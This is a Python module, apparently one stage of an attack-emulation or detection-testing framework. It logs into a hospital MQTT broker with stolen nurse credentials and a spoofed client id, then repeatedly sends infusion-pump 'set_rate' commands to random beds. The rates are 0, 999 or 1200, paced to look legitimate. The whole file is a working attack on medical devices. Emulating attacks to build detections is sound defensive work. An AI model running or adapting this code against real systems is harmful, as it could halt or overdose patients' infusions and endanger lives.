"""pump_cmd: connect with stolen nurse-station credentials and send unauthorised infusion-pump
commands at a plausible rate. Looks legitimate at the protocol level (the nurse is allowed to
command pumps); the signal is the source identity plus the command values/rate."""
import json
import time

import paho.mqtt.client as mqtt

from .creds import pick_creds
from .. import util


def pump_cmd(ctx, params):
    duration = int(params.get("duration", 60))
    per_min = int(params.get("cmds_per_min", 10))
    user, pw, src = pick_creds(ctx, "nurse")
    if not user:
        return {"outcome": "fail", "notes": "no nurse credentials available"}
    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                    client_id=params.get("client_id", "mon-admin"))
    c.username_pw_set(user, pw)
    sent = 0
    try:
        c.connect(ctx.broker_ip, 1883)
        c.loop_start()
        deadline = util.monotonic() + duration
        while util.monotonic() < deadline:
            bed = ctx.rng.randint(1, ctx.beds)
            cmd = {"action": "set_rate", "rate": ctx.rng.choice([0, 999, 1200]),
                   "ts": util.utc_iso()}
            c.publish(f"ward1/bed{bed}/pump/cmd", json.dumps(cmd), qos=0)
            sent += 1
            time.sleep(60.0 / per_min)
        c.loop_stop()
        c.disconnect()
    except Exception as exc:
        return {"outcome": "fail", "notes": str(exc), "creds_source": src}
    return {"targets": [ctx.broker_ip], "creds_source": src,
            "notes": f"sent {sent} unauthorised pump commands as {user} ({src})"}


pump_cmd.STAGE = "abuse-stolen-creds"
